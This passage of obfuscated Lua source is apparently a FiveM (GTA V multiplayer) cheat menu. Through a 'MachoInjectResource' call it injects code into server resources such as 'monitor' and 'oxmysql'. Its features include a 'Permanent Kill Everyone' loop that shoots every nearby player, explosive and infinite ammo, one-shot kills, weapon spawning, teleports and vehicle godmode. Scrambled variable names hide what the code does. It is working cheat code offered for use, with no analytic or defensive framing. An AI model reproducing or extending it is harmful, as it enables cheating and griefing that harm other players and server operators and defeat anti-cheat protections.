                local nBxMzLqPw = CreateThread
                local qWeRtYuiOp = ShootSingleBulletBetweenCoords

                nBxMzLqPw(function()
                    while aSwDeFgHiJkLoPx and not Unloaded do
                        Wait(gBvTnCuXe)
                        local bNmZxSwEd = GetActivePlayers()
                        local jUiKoLpMq = GetEntityCoords(mAxPlErOy)

                        for _, wQaSzXedC in ipairs(bNmZxSwEd) do
                            local zAsXcVbNm = GetPlayerPed(wQaSzXedC)
                            if zAsXcVbNm ~= mAxPlErOy and DoesEntityExist(zAsXcVbNm) and not IsPedDeadOrDying(zAsXcVbNm, true) then
                                local eDxCfVgBh = GetEntityCoords(zAsXcVbNm)
                                if #(eDxCfVgBh - jUiKoLpMq) <= lKjHgFdSa then
                                    local xScVbNmAz = vector3(
                                        eDxCfVgBh.x + (math.random() - 0.5) * 0.8,
                                        eDxCfVgBh.y + (math.random() - 0.5) * 0.8,
                                        eDxCfVgBh.z + 1.2
                                    )

                                    local dFgHjKlZx = vector3(
                                        eDxCfVgBh.x,
                                        eDxCfVgBh.y,
                                        eDxCfVgBh.z + 0.2
                                    )

                                    qWeRtYuiOp(
                                        xScVbNmAz.x, xScVbNmAz.y, xScVbNmAz.z,
                                        dFgHjKlZx.x, dFgHjKlZx.y, dFgHjKlZx.z,
                                        aSdFgHjKl,
                                        true,
                                        rVtNiUcEx,
                                        mAxPlErOy,
                                        true,
                                        false,
                                        100.0
                                    )
                                end
                            end
                        end
                    end
                end)
            end

            pLoMkIjUhbGyTf()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            aSwDeFgHiJkLoPx = false
        ]]);end);MachoMenuCheckbox(v40[2],"Permanent Kill Everyone",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if qWeRtYuIoPlMnAb == nil then qWeRtYuIoPlMnAb = false end
            qWeRtYuIoPlMnAb = true

            local function bZxLmNcVqPeTyUi()
                local vBnMkLoPi = PlayerPedId()
                local wQaSzXedC = GetHashKey("WEAPON_TRANQUILIZER")
                local eDxCfVgBh = 100
                local lKjHgFdSa = 1000.0
                local mAxPlErOy = 300.0

                local rTwEcVzUi = CreateThread
                local oPiLyKuJm = ShootSingleBulletBetweenCoords

                rTwEcVzUi(function()
                    while qWeRtYuIoPlMnAb and not Unloaded do
                        Wait(eDxCfVgBh)
                        local aSdFgHjKl = GetActivePlayers()
                        local xSwEdCvFr = GetEntityCoords(vBnMkLoPi)

                        for _, bGtFrEdCv in ipairs(aSdFgHjKl) do
                            local nMzXcVbNm = GetPlayerPed(bGtFrEdCv)
                            if nMzXcVbNm ~= vBnMkLoPi and DoesEntityExist(nMzXcVbNm) and not IsPedDeadOrDying(nMzXcVbNm, true) then
                                local zAsXcVbNm = GetEntityCoords(nMzXcVbNm)
                                if #(zAsXcVbNm - xSwEdCvFr) <= mAxPlErOy then
                                    local jUiKoLpMq = vector3(
                                        zAsXcVbNm.x + (math.random() - 0.5) * 0.8,
                                        zAsXcVbNm.y + (math.random() - 0.5) * 0.8,
                                        zAsXcVbNm.z + 1.2
                                    )

                                    local cReAtEtHrEaD = vector3(
                                        zAsXcVbNm.x,
                                        zAsXcVbNm.y,
                                        zAsXcVbNm.z + 0.2
                                    )

                                    oPiLyKuJm(
                                        jUiKoLpMq.x, jUiKoLpMq.y, jUiKoLpMq.z,
                                        cReAtEtHrEaD.x, cReAtEtHrEaD.y, cReAtEtHrEaD.z,
                                        lKjHgFdSa,
                                        true,
                                        wQaSzXedC,
                                        vBnMkLoPi,
                                        true,
                                        false,
                                        100.0
                                    )
                                end
                            end
                        end
                    end
                end)
            end

            bZxLmNcVqPeTyUi()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            qWeRtYuIoPlMnAb = false
        ]]);end);local v52=MachoMenuInputbox(v41[1],"Coords:","x, y, z");MachoMenuButton(v41[1],"Teleport to Coords",function() local v199=0 + 0 ;local v200;while true do if (0==v199) then v200=MachoMenuGetInputbox(v52);if (v200 and (v200~="")) then local v323=0;local v324;local v325;local v326;while true do if (v323==1) then v325=tonumber(v325);v326=tonumber(v326);v323=5 -3 ;end if (v323==(2 + 0)) then if (v324 and v325 and v326) then MachoInjectResource((v48("monitor") and "monitor") or "any" ,string.format([[
                    local function b0NtdqLZKW()
                        local uYiTpLaNmZxCwEq = SetEntityCoordsNoOffset
                        local nHgFdSaZxCvBnMq = PlayerPedId
                        local XvMzAsQeTrBnLpK = IsPedInAnyVehicle
                        local QeTyUvGhTrBnAzX = GetVehiclePedIsIn
                        local BvNzMkJdHsLwQaZ = GetGroundZFor_3dCoord

                        local x, y, z = %f, %f, %f
                        local found, gZ = BvNzMkJdHsLwQaZ(x, y, z + 1000.0, true)
                        if found then z = gZ + 1.0 end

                        local ent = XvMzAsQeTrBnLpK(nHgFdSaZxCvBnMq(), false) and QeTyUvGhTrBnAzX(nHgFdSaZxCvBnMq(), false) or nHgFdSaZxCvBnMq()
                        uYiTpLaNmZxCwEq(ent, x, y, z, false, false, false)
                    end

                    b0NtdqLZKW()
                ]],v324,v325,v326));end break;end if (v323==0) then v324,v325,v326=v200:match("([^,]+),%s*([^,]+),%s*([^,]+)");v324=tonumber(v324);v323=1;end end end break;end end end);MachoMenuButton(v41[772 -(326 + 445) ],"Waypoint",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function xQX7uzMNfb()
                local mNbVcXtYuIoPlMn = GetFirstBlipInfoId
                local zXcVbNmQwErTyUi = DoesBlipExist
                local aSdFgHjKlQwErTy = GetBlipInfoIdCoord
                local lKjHgFdSaPlMnBv = PlayerPedId
                local qWeRtYuIoPlMnBv = SetEntityCoords

                local function XcVrTyUiOpAsDfGh()
                    local RtYuIoPlMnBvZx = mNbVcXtYuIoPlMn(8)
                    if not zXcVbNmQwErTyUi(RtYuIoPlMnBvZx) then return nil end
                    return aSdFgHjKlQwErTy(RtYuIoPlMnBvZx)
                end

                local GhTyUoLpZmNbVcXq = XcVrTyUiOpAsDfGh()
                if GhTyUoLpZmNbVcXq then
                    local QwErTyUiOpAsDfGh = lKjHgFdSaPlMnBv()
                    qWeRtYuIoPlMnBv(QwErTyUiOpAsDfGh, GhTyUoLpZmNbVcXq.x, GhTyUoLpZmNbVcXq.y, GhTyUoLpZmNbVcXq.z + 5.0, false, false, false, true)
                end
            end

            xQX7uzMNfb()
        ]]);end);MachoMenuButton(v41[4 -3 ],"FIB Building",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function HAZ6YqLRbM()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 140.43, -750.52, 258.15
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            HAZ6YqLRbM()
        ]]);end);MachoMenuButton(v41[2 -1 ],"Mission Row PD",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function oypB9FcNwK()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 425.1, -979.5, 30.7
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            oypB9FcNwK()
        ]]);end);MachoMenuButton(v41[2 -1 ],"Pillbox Hospital",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function TmXU0zLa4e()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 308.6, -595.3, 43.28
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            TmXU0zLa4e()
        ]]);end);MachoMenuButton(v41[712 -(530 + 181) ],"Del Perro Pier",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function eLQN9XKwbJ()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = -1632.87, -1007.81, 13.07
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            eLQN9XKwbJ()
        ]]);end);MachoMenuButton(v41[1],"Grove Street",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function YrAFvPMkqt()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 109.63, -1943.14, 20.80
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            YrAFvPMkqt()
        ]]);end);MachoMenuButton(v41[882 -(614 + 267) ],"Legion Square",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function zdVCXL8rjp()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 229.21, -871.61, 30.49
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            zdVCXL8rjp()
        ]]);end);MachoMenuButton(v41[1],"LS Customs",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function oKXpQUYwd5()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = -365.4, -131.8, 37.7
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            oKXpQUYwd5()
        ]]);end);MachoMenuButton(v41[1],"Maze Bank",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function E1tYUMowqF()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = -75.24, -818.95, 326.1
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            E1tYUMowqF()
        ]]);end);MachoMenuButton(v41[33 -(19 + 13) ],"Mirror Park",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function Ptn2qMBvYe()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 1039.2, -765.3, 57.9
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            Ptn2qMBvYe()
        ]]);end);MachoMenuButton(v41[1],"Vespucci Beach",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function gQZf7xYULe()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = -1223.8, -1516.6, 4.4
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            gQZf7xYULe()
        ]]);end);MachoMenuButton(v41[1],"Vinewood",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function JqXLKbvR20()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 293.2, 180.5, 104.3
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            JqXLKbvR20()
        ]]);end);MachoMenuButton(v41[1],"Sandy Shores",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function NxvTpL3qWz()
                local aSdFgHjKlQwErTy = PlayerPedId
                local zXcVbNmQwErTyUi = IsPedInAnyVehicle
                local qWeRtYuIoPlMnBv = GetVehiclePedIsIn
                local xCvBnMqWeRtYuIo = SetEntityCoordsNoOffset

                local x, y, z = 1843.10, 3707.60, 33.52
                local ped = aSdFgHjKlQwErTy()
                local ent = zXcVbNmQwErTyUi(ped, false) and qWeRtYuIoPlMnBv(ped, false) or ped
                xCvBnMqWeRtYuIo(ent, x, y, z, false, false, false)
            end

            NxvTpL3qWz()
        ]]);end);MachoMenuButton(v41[2],"Print Current Coords",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            local function Xy9TqLzVmN()
                local zXcVbNmQwErTyUi = GetEntityCoords
                local aSdFgHjKlQwErTy = PlayerPedId

                local coords = zXcVbNmQwErTyUi(aSdFgHjKlQwErTy())
                local x, y, z = coords.x, coords.y, coords.z
                print(string.format("[^3JTG^7] [^4DEBUG^7] - %.2f, %.2f, %.2f", x, y, z))
            end

            Xy9TqLzVmN()
        ]]);end);MachoMenuCheckbox(v42[1 -0 ],"Infinite Ammo",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
            LkJgFdSaQwErTy = true

            local function qUwKZopRM8()
                if LkJgFdSaQwErTy == nil then LkJgFdSaQwErTy = false end
                LkJgFdSaQwErTy = true

                local MnBvCxZlKjHgFd = CreateThread
                MnBvCxZlKjHgFd(function()
                    local AsDfGhJkLzXcVb = PlayerPedId
                    local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
                    local ZxCvBnMqWeRtYu = GetSelectedPedWeapon
                    local ErTyUiOpAsDfGh = GetAmmoInPedWeapon
                    local GhJkLzXcVbNmQw = SetPedAmmo

                    while LkJgFdSaQwErTy and not Unloaded do
                        local ped = AsDfGhJkLzXcVb()
                        local weapon = ZxCvBnMqWeRtYu(ped)

                        QwErTyUiOpAsDf(ped, true)

                        if ErTyUiOpAsDfGh(ped, weapon) <= 0 then
                            GhJkLzXcVbNmQw(ped, weapon, 250)
                        end

                        Wait(0)
                    end
                end)
            end

            qUwKZopRM8()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            LkJgFdSaQwErTy = false

            local function yFBN9pqXcL()
                local AsDfGhJkLzXcVb = PlayerPedId
                local QwErTyUiOpAsDf = SetPedInfiniteAmmoClip
                QwErTyUiOpAsDf(AsDfGhJkLzXcVb(), false)
            end

            yFBN9pqXcL()
        ]]);end);MachoMenuCheckbox(v42[1],"Explosive Ammo",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
            QzWxEdCvTrBnYu = true

            local function WpjLRqtm28()
                if QzWxEdCvTrBnYu == nil then QzWxEdCvTrBnYu = false end
                QzWxEdCvTrBnYu = true

                local UyJhNbGtFrVbCx = CreateThread
                UyJhNbGtFrVbCx(function()
                    local HnBvFrTgYhUzKl = PlayerPedId
                    local TmRgVbYhNtKjLp = GetPedLastWeaponImpactCoord
                    local JkLpHgTfCvXzQa = AddOwnedExplosion

                    while QzWxEdCvTrBnYu and not Unloaded do
                        local CvBnYhGtFrLpKm = HnBvFrTgYhUzKl()
                        local XsWaQzEdCvTrBn, PlKoMnBvCxZlQj = TmRgVbYhNtKjLp(CvBnYhGtFrLpKm)

                        if XsWaQzEdCvTrBn then
                            JkLpHgTfCvXzQa(CvBnYhGtFrLpKm, PlKoMnBvCxZlQj.x, PlKoMnBvCxZlQj.y, PlKoMnBvCxZlQj.z, 6, 1.0, true, false, 0.0)
                        end

                        Wait(0)
                    end
                end)
            end

            WpjLRqtm28()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            QzWxEdCvTrBnYu = false
        ]]);end);MachoMenuCheckbox(v42[2 -1 ],"Oneshot Kill",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if RfGtHyUjMiKoLp == nil then RfGtHyUjMiKoLp = false end
            RfGtHyUjMiKoLp = true

            local function xUQp7AK0tv()
                local PlMnBvCxZaSdFg = CreateThread
                PlMnBvCxZaSdFg(function()
                    local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
                    local AsDfGhJkLzXcVb = SetWeaponDamageModifier
                    local ErTyUiOpAsDfGh = PlayerPedId

                    while RfGtHyUjMiKoLp do
                        if Unloaded then
                            RfGtHyUjMiKoLp = false
                            break
                        end

                        local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
                        if Wp and Wp ~= 0 then
                            AsDfGhJkLzXcVb(Wp, 1000.0)
                        end

                        Wait(0)
                    end
                end)
            end

            xUQp7AK0tv()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            RfGtHyUjMiKoLp = false
            local ZxCvBnNmLkJhGf = GetSelectedPedWeapon
            local AsDfGhJkLzXcVb = SetWeaponDamageModifier
            local ErTyUiOpAsDfGh = PlayerPedId
            local Wp = ZxCvBnNmLkJhGf(ErTyUiOpAsDfGh())
            if Wp and Wp ~= 0 then
                AsDfGhJkLzXcVb(Wp, 1.0)
            end
        ]]);end);local v53=MachoMenuInputbox(v42[5 -3 ],"Weapon:","...");MachoMenuButton(v42[1 + 1 ],"Spawn Weapon",function() local v201=0 -0 ;local v202;while true do if (v201==0) then v202=MachoMenuGetInputbox(WeaponSpawnerBox);if (v202 and (v202~="")) then MachoInjectResource((v48("monitor") and "monitor") or "any" ,string.format([[
                local function GiveWeapon()
                    local ped = PlayerPedId()
                    local weapon = GetHashKey("%s")
                    local XeCwVrBtNuMyLk = GiveWeaponToPed
                    XeCwVrBtNuMyLk(ped, weapon, 250, true, true)
                end

                GiveWeapon()
            ]],v202));end break;end end end);local v54=0 -0 ;local v55={[1812 -(1293 + 519) ]={name="Default",hash="MP_F_Freemode"},[1]={name="Gangster",hash="Gang1H"},[3 -1 ]={name="Wild",hash="GangFemale"},[3]={name="Red Neck",hash="Hillbilly"}};MachoMenuDropDown(v42[3],"Aiming Style",function(v203) v54=v203;end,"Default","Gangster","Wild","Red Neck");MachoMenuButton(v42[3],"Apply Aiming Style",function() local v204=v55[v54];if  not v204 then return;end MachoInjectResource((v48("oxmysql") and "oxmysql") or "any" ,([[
            local function vXK2dPLR07()
                local UiOpAsDfGhJkLz = PlayerPedId
                local PlMnBvCxZaSdFg = GetHashKey
                local QwErTyUiOpAsDf = SetWeaponAnimationOverride

                local MnBvCxZaSdFgHj = PlMnBvCxZaSdFg("%s")
                QwErTyUiOpAsDf(UiOpAsDfGhJkLz(), MnBvCxZaSdFgHj)
            end

            vXK2dPLR07()

        ]]):format(v204.hash));end);MachoMenuCheckbox(v43[2 -1 ],"Vehicle Godmode",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if zXcVbNmQwErTyUi == nil then zXcVbNmQwErTyUi = false end
            zXcVbNmQwErTyUi = true

            local function LWyZoXRbqK()
                local LkJhGfDsAzXcVb = CreateThread
                LkJhGfDsAzXcVb(function()
                    while zXcVbNmQwErTyUi and not Unloaded do
                        local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                        local TyUiOpAsDfGhJkL = PlayerPedId
                        local AsDfGhJkLzXcVbN = SetEntityInvincible

                        local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), false)
                        if vehicle and vehicle ~= 0 then
                            AsDfGhJkLzXcVbN(vehicle, true)
                        end
                        Wait(0)
                    end
                end)
            end

            LWyZoXRbqK()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            zXcVbNmQwErTyUi = false
            local QwErTyUiOpAsDfG = GetVehiclePedIsIn
            local TyUiOpAsDfGhJkL = PlayerPedId
            local AsDfGhJkLzXcVbN = SetEntityInvincible

            local vehicle = QwErTyUiOpAsDfG(TyUiOpAsDfGhJkL(), true)
            if vehicle and vehicle ~= 0 then
                AsDfGhJkLzXcVbN(vehicle, false)
            end
        ]]);end);MachoMenuCheckbox(v43[1 -0 ],"Force Vehicle Engine",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if GhYtReFdCxWaQzLp == nil then GhYtReFdCxWaQzLp = false end
            GhYtReFdCxWaQzLp = true

            local function OpAsDfGhJkLzXcVb()
                local lMnbVcXzZaSdFg = CreateThread
                lMnbVcXzZaSdFg(function()
                    local QwErTyUiOp         = _G.PlayerPedId
                    local AsDfGhJkLz         = _G.GetVehiclePedIsIn
                    local TyUiOpAsDfGh       = _G.GetVehiclePedIsTryingToEnter
                    local ZxCvBnMqWeRtYu     = _G.SetVehicleEngineOn
                    local ErTyUiOpAsDfGh     = _G.SetVehicleUndriveable
                    local KeEpOnAb           = _G.SetVehicleKeepEngineOnWhenAbandoned
                    local En_g_Health_Get    = _G.GetVehicleEngineHealth
                    local En_g_Health_Set    = _G.SetVehicleEngineHealth
                    local En_g_Degrade_Set   = _G.SetVehicleEngineCanDegrade
                    local No_Hotwire_Set     = _G.SetVehicleNeedsToBeHotwired

                    local function _tick(vh)
                        if vh and vh ~= 0 then
                            No_Hotwire_Set(vh, false)
                            En_g_Degrade_Set(vh, false)
                            ErTyUiOpAsDfGh(vh, false)
                            KeEpOnAb(vh, true)

                            local eh = En_g_Health_Get(vh)
                            if (not eh) or eh < 300.0 then
                                En_g_Health_Set(vh, 900.0)
                            end

                            ZxCvBnMqWeRtYu(vh, true, true, true)
                        end
                    end

                    while GhYtReFdCxWaQzLp and not Unloaded do
                        local p  = QwErTyUiOp()

                        _tick(AsDfGhJkLz(p, false))
                        _tick(TyUiOpAsDfGh(p))
                        _tick(AsDfGhJkLz(p, true))

                        Wait(0)
                    end
                end)
            end

            OpAsDfGhJkLzXcVb()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            GhYtReFdCxWaQzLp = false
            local v = GetVehiclePedIsIn(PlayerPedId(), false)
            if v and v ~= 0 then
                SetVehicleKeepEngineOnWhenAbandoned(v, false)
                SetVehicleEngineCanDegrade(v, true)
                SetVehicleUndriveable(v, false)
            end
        ]]);end);MachoMenuCheckbox(v43[4 -3 ],"Vehicle Auto Repair",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if PlAsQwErTyUiOp == nil then PlAsQwErTyUiOp = false end
            PlAsQwErTyUiOp = true

            local function uPkqLXTm98()
                local QwErTyUiOpAsDf = CreateThread
                QwErTyUiOpAsDf(function()
                    while PlAsQwErTyUiOp and not Unloaded do
                        local AsDfGhJkLzXcVb = PlayerPedId
                        local LzXcVbNmQwErTy = GetVehiclePedIsIn
                        local VbNmLkJhGfDsAz = SetVehicleFixed
                        local MnBvCxZaSdFgHj = SetVehicleDirtLevel

                        local ped = AsDfGhJkLzXcVb()
                        local vehicle = LzXcVbNmQwErTy(ped, false)
                        if vehicle and vehicle ~= 0 then
                            VbNmLkJhGfDsAz(vehicle)
                            MnBvCxZaSdFgHj(vehicle, 0.0)
                        end

                        Wait(0)
                    end
                end)
            end

            uPkqLXTm98()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            PlAsQwErTyUiOp = false
        ]]);end);MachoMenuCheckbox(v43[2 -1 ],"Freeze Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if LzKxWcVbNmQwErTy == nil then LzKxWcVbNmQwErTy = false end
            LzKxWcVbNmQwErTy = true

            local function WkQ79ZyLpT()
                local tYhGtFrDeSwQaZx = CreateThread
                local xCvBnMqWeRtYuIo = PlayerPedId
                local aSdFgHjKlZxCvBn = GetVehiclePedIsIn
                local gKdNqLpYxMiV = FreezeEntityPosition
                local jBtWxFhPoZuR = Wait

                tYhGtFrDeSwQaZx(function()
                    while LzKxWcVbNmQwErTy and not Unloaded do
                        local VbNmLkJhGfDsAzX = xCvBnMqWeRtYuIo()
                        local IoPlMnBvCxZaSdF = aSdFgHjKlZxCvBn(VbNmLkJhGfDsAzX, false)
                        if IoPlMnBvCxZaSdF and IoPlMnBvCxZaSdF ~= 0 then
                            gKdNqLpYxMiV(IoPlMnBvCxZaSdF, true)
                        end
                        jBtWxFhPoZuR(0)
                    end
                end)
            end

            WkQ79ZyLpT()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            LzKxWcVbNmQwErTy = false

            local function i7qWlBXtPo()
                local yUiOpAsDfGhJkLz = PlayerPedId
                local QwErTyUiOpAsDfG = GetVehiclePedIsIn
                local FdSaPlMnBvCxZlK = FreezeEntityPosition

                local pEdRfTgYhUjIkOl = yUiOpAsDfGhJkLz()
                local zXcVbNmQwErTyUi = QwErTyUiOpAsDfG(pEdRfTgYhUjIkOl, true)
                if zXcVbNmQwErTyUi and zXcVbNmQwErTyUi ~= 0 then
                    FdSaPlMnBvCxZlK(zXcVbNmQwErTyUi, false)
                end
            end

            i7qWlBXtPo()
        ]]);end);MachoMenuCheckbox(v43[1 + 0 ],"Vehicle Hop",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if NuRqVxEyKiOlZm == nil then NuRqVxEyKiOlZm = false end
            NuRqVxEyKiOlZm = true

            local function qPTnXLZKyb()
                local ZlXoKmVcJdBeTr = CreateThread
                ZlXoKmVcJdBeTr(function()
                    while NuRqVxEyKiOlZm and not Unloaded do
                        local GvHnMzLoPqAxEs = PlayerPedId
                        local DwZaQsXcErDfGt = GetVehiclePedIsIn
                        local BtNhUrLsEkJmWq = IsDisabledControlPressed
                        local PlZoXvNyMcKwQi = ApplyForceToEntity

                        local GtBvCzHnUkYeWr = GvHnMzLoPqAxEs()
                        local OaXcJkWeMzLpRo = DwZaQsXcErDfGt(GtBvCzHnUkYeWr, false)

                        if OaXcJkWeMzLpRo and OaXcJkWeMzLpRo ~= 0 and BtNhUrLsEkJmWq(0, 22) then
                            PlZoXvNyMcKwQi(OaXcJkWeMzLpRo, 1, 0.0, 0.0, 6.0, 0.0, 0.0, 0.0, 0, true, true, true, true, true)
                        end

                        Wait(0)
                    end
                end)
            end

            qPTnXLZKyb()
        ]]);end,function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            NuRqVxEyKiOlZm = false
        ]]);end);MachoMenuCheckbox(v43[1 + 0 ],"Rainbow Vehicle",function() MachoInjectResource((v48("monitor") and "monitor") or (v48("oxmysql") and "oxmysql") or "any" ,[[
            if GxRpVuNzYiTq == nil then GxRpVuNzYiTq = false end
